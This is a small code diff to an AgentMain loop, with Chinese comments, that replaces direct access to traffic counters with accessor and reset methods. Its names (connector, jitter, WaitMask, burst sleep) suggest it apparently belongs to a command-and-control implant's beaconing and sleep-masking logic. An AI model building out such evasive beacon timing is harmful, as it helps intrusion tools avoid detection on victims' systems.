@@ -362,7 +362,7 @@ void AgentMain()
 
 			BOOL burst = FALSE;
 			// 阈值 512KB：认为正在传输大任务
-			if ((g_Connector->lastUpTotal >= (512 * 1024)) || (g_Connector->lastDownTotal >= (512 * 1024))) {
+			if ((g_Connector->GetLastUpTotal() >= (512 * 1024)) || (g_Connector->GetLastDownTotal() >= (512 * 1024))) {
 				burst = TRUE;
 			}
 
@@ -373,8 +373,7 @@ void AgentMain()
 					halfSleep = baseSleep;
 				WaitMask(g_Agent->GetWorkingSleep(), halfSleep, jitter);
 				// 用完一轮后清零统计，后续再根据新一轮大任务重新进入 burst
-				g_Connector->lastUpTotal   = 0;
-				g_Connector->lastDownTotal = 0;
+				g_Connector->ResetTrafficTotals();
 			} else {
 				// 正常情况下沿用原始 sleep/jitter
 				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
